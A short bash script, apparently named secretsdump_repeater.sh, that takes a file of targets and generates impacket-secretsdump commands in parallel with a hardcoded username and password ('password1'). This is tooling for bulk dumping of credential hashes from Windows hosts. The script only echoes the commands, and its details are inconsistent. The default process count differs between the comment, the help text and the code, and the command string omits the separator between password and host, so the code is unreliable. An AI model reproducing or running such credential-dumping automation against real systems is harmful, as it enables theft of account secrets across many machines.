#!/bin/bash
# If you want to specify a different number of parallel processes, you can use the -n option followed by the number of processes. For example, to run with 5 parallel processes:
# ./secretsdump_repeater.sh -n 8 input.txt

show_help() {
    echo "Usage: $0 [file]"
    echo
    echo "This script processes each line of a given file in parallel and executes a command using that line."
    echo
    echo "Arguments:"
    echo "  file    Path to the file to process"
    echo
    echo "Options:"
    echo "  -h      Display this help message and exit"
    echo "  -n      Number of parallel processes (default is 10)"
}

# Default number of parallel processes
num_parallel=5

# Check for help option
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    show_help
    exit 0
fi

# Check for parallel option
if [[ "$1" == "-n" && -n "$2" ]]; then
    num_parallel=$2
    shift 2
fi

# Check if file argument is provided
if [ -z "$1" ]; then
    echo "Error: No file specified."
    show_help
    exit 1
fi

# Function to process line
process_line() {
    line=$1
    echo "impacket-secretsdump user:'password1'$line"
}

export -f process_line

# Read file and process lines in parallel
cat "$1" | xargs -I {} -P "$num_parallel" bash -c 'process_line "$@"' _ {}
